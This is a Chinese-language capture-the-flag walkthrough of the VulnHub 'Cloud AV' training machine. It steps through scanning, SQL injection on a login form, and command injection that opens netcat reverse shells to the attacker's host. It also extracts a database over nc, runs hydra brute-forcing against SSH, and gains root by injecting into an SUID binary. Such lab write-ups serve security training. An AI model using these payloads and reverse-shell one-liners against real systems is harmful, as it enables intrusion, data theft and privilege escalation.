靶机地址：[BoredHackerBlog: Cloud AV ~ VulnHub](https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/)
主机发现
```Shell
sudo arp-scan -l
# 发现 192.168.1.27

# 这个也行 更通用 但是麻烦一点儿
for i in $(seq 1 254); do sudo arping -c 1 192.168.1.$i; done
```
端口扫描
```Shell
sudo nmap -p- 192.168.1.27
# 22 8080
```
服务枚举
```Shell
sudo nmap -p22,8080 -sV 192.168.1.27
# 22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
# 8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15rc1)
```
访问web服务，发现是一个表单。
随便输入一串字符33334444，使用Burp Suite拦截请求。
```
# 右键 Send to Intruder
# 将password的值设置为注入点
```
特殊字符字典：
```
`
~
!
@
#
$
%
^
&
*
(
)
-
_
+
=
[
]
{
}
\
|
;
:
'
"
,
<
.
>
/
?
```
加载进去，点击start，开始测试。
发现符号 `"` 和 符号 `%` 触发了错误，返回结果中包含了很多信息，例如：
```
File "/home/scanner/cloudav_app/app.py", line 18, in login
if len(c.execute('select * from code where password="' + password + '"').fetchall()) > 0:
```
观察代码，尝试如下SQL注入。
```
" or 1=1--
" or "1"="1
```
都可以注入成功，通过后的页面类似 `ls -l` 的输出
暴力破解也能出密码
```
password
```
这里如果不存在SQL注入，可以尝试使用暴力破解，字典文件目录如下：
```Shell
ls /usr/share/wordlists
```
这个表单是提交一个文件名，尝试使用命令注入，提交如下内容，使用管道有时候也行。
```
hello; id
hello | id
```
观察响应结果，确实存在命令注入漏洞，看看系统中是否存在某些工具
```
hello; echo; which sh
hello; echo; which nc
```
发现存在 `nc` ，尝试直接反弹shell
```
hello; nc 192.168.1.26 4444 -e /bin/sh
```
反弹失败了，没有收到连接，可能是目标机器上的 `nc` 不支持 `-e` 参数
这种情况下一般使用 `nc` 的串联，需要在自己的机器上开启两个侦听端口
```Shell
nc -nvlp 3333
nc -nvlp 4444
```
靶机上注入如下命令
```Shell
nc 192.168.1.26 3333 | /bin/bash | nc 192.168.1.26 4444
# 或直接
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i &> | nc 192.168.1.26 4444 > /tmp/f
```
即一边输入指令，另一边看输出结果，最终输入如下字符串
```
hello; nc 192.168.1.26 3333 | /bin/bash | nc 192.168.1.26 4444
```
或
```
hello;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.26 4444 >/tmp/f
```
没问题，成功获取到了shell
```Shell
ls -la # 查看文件
uname -a # 查看系统版本
```
发现一个 `database.sql`
```Shell
file database.sql # 查看文件类型
```
考虑下载到本地，看看有没有机密信息
```Shell
ncat -nvlp 5555 > database.sql
nc 192.168.1.26 5555 < database.sql
```
查看文件内容
```Shell
sqlite3
sqlite> .open database.sql # 打开数据库文件
sqlite> .database # 查看数据库
sqlite> .dump # 查看数据
sqlite> .exit # 退出
```
发现存在四个密码
```
INSERT INTO code VALUES('myinvitecode123');
INSERT INTO code VALUES('mysecondinvitecode');
INSERT INTO code VALUES('cloudavtech');
INSERT INTO code VALUES('mostsecurescanner');
```
枚举用户
```Shell
# 筛选可以登录的
cat /etc/passwd | grep -v "nologin" | cut -d : -f 1
# 筛选有bash的
cat /etc/passwd | grep "/bin/bash" | cut -d : -f 1
```
有 `bash` 的结果如下
```
root
cloudav
scanner
```
尝试对暴力破解SSH连接
```Shell
hydra -L user.txt -P pass.txt ssh://192.168.1.27
```
尝试失败了，没有有效的账号密码
没有发现可以利用的文件，尝试到上一级目录中寻找
```Shell
cd ..
ls -l
# drwxrwxr-x 4 scanner scanner 4096 Oct 24  2018 cloudav_app
# -rwsr-xr-x 1 root    scanner 8576 Oct 24  2018 update_cloudav
# -rw-rw-r-- 1 scanner scanner  393 Oct 24  2018 update_cloudav.c
```
尝试SUID提权
```Shell
find / -perm -u=s -type f -user root ! -group root 2>/dev/null -exec ls -l {} \;
```
发现一个属主为root的SUID文件，通过SUID提权也是一种常用的提权方式
```Shell
# 先查看源代码
cat update_cloudav.c
```
发现可以尝试使用命令注入
```Shell
./update_cloudav "a; nc 192.168.1.26 5555 | /bin/bash | nc 192.168.1.26 6666"
# 或
./update_cloudav "a;rm /tmp/fr;mkfifo /tmp/fr;cat /tmp/fr|/bin/sh -i 2>&1|nc 192.168.1.26 5555 >/tmp/fr"
```
成功获取到root权限，直接bash也行
```Shell
./update_cloudav "a;bash -i"
```